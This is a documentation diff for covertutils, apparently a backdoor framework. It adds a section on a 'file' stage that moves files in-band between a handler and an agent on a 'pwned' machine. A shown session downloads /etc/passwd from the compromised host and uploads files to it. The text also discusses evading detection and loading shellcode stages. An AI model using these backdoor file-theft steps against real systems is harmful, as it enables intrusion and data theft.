@@ -1,12 +1,14 @@
+
+.. _stages_page:
+
 Beyond the OS Shell
 ===================
 
 The `covertutils` package has an API for creating custom stages that can be dynamically loaded to compromised machines.
 If a :class:`covertutils.handlers.stageable.StageableHandler` is running in a pwned machine stages can be pushed to it.
 
-The API is documented in the `payloads` section (under construction).
+The API is fully documented in the :ref:`stage_api_page` page.
 
-Some stages are demonstrarted in this page.
 
 
 .. _pythonapi-stage:
@@ -161,4 +163,57 @@ A `SubShell` is also available that translates copy-pasted `shellcodes` from var
 * The `shellcode` used in the demo is taken from https://www.exploit-db.com/exploits/42254/
 
 
-Oh, and on more thing! `Shellcodes` do no need to be `Null Free` (of course!). The string termination is on Python.
+Oh, and on more thing! `Shellcodes` do no need to be `Null Free` (of course!). The string termination is on Python, and they are transmitted **encrypted by design** anyway.
+
+
+
+The `File` Stage
+------------------
+
+What good is a backdoor if you can't use it to **leak files**? Or even upload executables and that kind of stuff.
+
+Actually, after the first smile when the pure `netcat reverse shell oneliner` returns, doing stuff with it becomes a pain really fast.
+And the next step is trying to ``wget`` stuff with the non-tty shell, or copy-pasting `Base64 encoded` files from the screen.
+
+Miserable things happen when there aren't specific commands for file upload/download to the compromised system. And out-of-band methods (`pastebin`, `wget`, etc) can easily be identified as abnormal...
+
+The `covertutils` package has a `file` stage and subshell, to provide file transfers from the `Agent` to the `Handler` and vice-versa in an in-band manner (using the same `Communication Channel`).
+
+.. code:: bash
+
+	(127.0.0.1:56402)>
+	Available Streams:
+		[ 0] - control
+		[ 1] - python
+		[ 2] - os-shell
+		[ 3] - file
+		[ 4] - stage
+		[99] - EXIT
+	Select stream: 3
+	=|file]> ~ help download
+	download <remote-file> [<location>]
+
+	=|file]> ~
+	=|file]> ~ download /etc/passwd
+	=|file]> ~ File downloaded!
+
+	=|file]> ~ download /etc/passwd renamed.txt
+	=|file]> ~ File downloaded!
+
+	=|file]> ~ help upload
+	upload  <local-file> [<remote-location>]
+
+	=|file]> ~
+	=|file]> ~ upload /etc/passwd myusers
+	=|file]> ~ File uploaded succesfully!
+
+	=|file]> ~
+	=|file]> ~ upload /etc/passwd
+	=|file]> ~ File uploaded succesfully!
+
+
+*Providing file transfer `in-band` is a double-edged knife.
+If the `Communication Channel` is a TCP connection then files will flow around nicely (taking also advantage of the embedded compression, see: :ref:`compressor_component` ).
+But if the `Communication Channel` is a `covert TCP backdoor` or such `super-low-bandwidth` channel, a 1MB file will `take forever to download`, taking over the whole channel. An out-of-band approach should be considered in this case.
+
+*Transfer of files can trigger the :class:`StreamIdentifier`'s `Birthday Problem` (TODO: document it) destroying 1 or more `streams` (the `control stream` should still work to ``!control reset`` the connection). For heavy use of file transferring, a bigger ``tag_length`` should be used on the :class:`Orchestrator` passed to the :class:`Handler` object.
